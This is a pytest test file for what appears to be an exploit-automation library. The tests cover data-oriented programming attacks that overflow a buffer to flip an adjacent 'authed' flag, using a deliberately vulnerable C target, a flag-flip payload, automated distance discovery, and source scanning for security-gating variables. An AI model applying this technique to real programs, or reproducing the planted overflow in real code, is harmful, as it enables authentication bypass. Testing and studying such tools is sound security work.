"""Data-Oriented Programming: reach a privileged objective by flipping a security-decision variable
with a memory write -- no control-flow hijack. The write makes the program's own code take the
guarded path; confirmed by the privileged action's marker, with a negative control that must miss."""
from __future__ import annotations

import subprocess

import pytest
from lykos.analyze.poc import dop

# A data-only target: a global command buffer and an `authed` flag adjacent in .bss. Reading past the
# buffer flips `authed`, so the program runs its PRIVILEGED branch (prints the secret) with no gadget
# and no instruction-pointer control -- the branch is taken by the program's own logic.
_SRC = r"""
#include <stdio.h>
#include <unistd.h>
#include <string.h>
static char name[16];
static int authed = 0;
int main(void){
  setvbuf(stdout,0,2,0);
  int n = read(0, name, 64);          /* overflow: name is 16 bytes, read up to 64 */
  if (n <= 0) return 0;
  if (authed) { write(1, "SECRET{data-only-win}\n", 22); }
  else        { write(1, "denied\n", 7); }
  return 0;
}
"""


@pytest.fixture
def dop_bin(tmp_path, gcc):
    c = tmp_path / "d.c"; c.write_text(_SRC)
    exe = tmp_path / "d"
    # no stack protector; globals land in .bss in declaration order so name is just below authed.
    if subprocess.run([gcc, "-O0", "-fno-stack-protector", "-no-pie", "-w", str(c), "-o", str(exe)],
                      capture_output=True).returncode != 0:
        pytest.skip("cannot build dop fixture")
    return exe


def test_data_only_flag_flip_reaches_privileged_path(dop_bin):
    """The overflow flips `authed` and the privileged branch runs -- a data-only objective, no PC
    control. The exact distance is discovered by the bounded oracle-confirmed sweep."""
    plan = dop.sweep_flag_flip(str(dop_bin), marker=b"SECRET{data-only-win}", max_distance=64)
    assert plan is not None, "data-only flag flip not confirmed"


def test_negative_control_benign_input_denied(dop_bin):
    """Guard the oracle: a benign (non-overflowing) input must NOT reach the privileged path, so the
    confirmed flip above is caused by our write, not the program itself."""
    out = subprocess.run([str(dop_bin)], input=b"alice\n", capture_output=True, timeout=8).stdout
    assert b"SECRET" not in out and b"denied" in out


def test_plan_flag_flip_bytes():
    p = dop.plan_flag_flip(16, flip=b"\x01")
    assert p.payload == b"A" * 16 + b"\x01" and p.negative == b"A" * 16


def test_hands_off_discovery_finds_signal_and_distance(dop_bin):
    """P0 discovery half: with NO marker and NO distance supplied, discover_data_only finds the
    privileged signal (by diffing against a benign run) and the overflow distance -- the data-only
    chain fires hands-off."""
    plan, tok = dop.discover_data_only(str(dop_bin), max_distance=64)
    assert plan is not None and tok is not None
    assert b"SECRET" in tok   # the discovered privileged token is the guarded action's own output


def test_find_dop_targets_source():
    """Source-side DOP discovery: find the security-decision variable gating a privileged action."""
    src = """
    int handle(request_t* r) {
        int is_admin = check(r);
        parse(r);
        if (is_admin) {
            system(r->cmd);          /* privileged action */
        }
        if (!r->authenticated) return -1;
        send_secret(r);
        return 0;
    }
    """
    targets = dop.find_dop_targets(src)
    vars_ = {t["var"].lstrip("!") for t in targets}
    assert "is_admin" in vars_          # flag gating system()
    # authenticated gate before send_secret should also surface
    assert any("auth" in v.lower() for v in vars_)


def test_find_dop_targets_ignores_plain_conditionals():
    src = """
    void f(int n) {
        if (n > 0) { memcpy(a, b, n); }   /* n is not a security decision */
        if (len) { total += len; }
    }
    """
    assert dop.find_dop_targets(src) == []
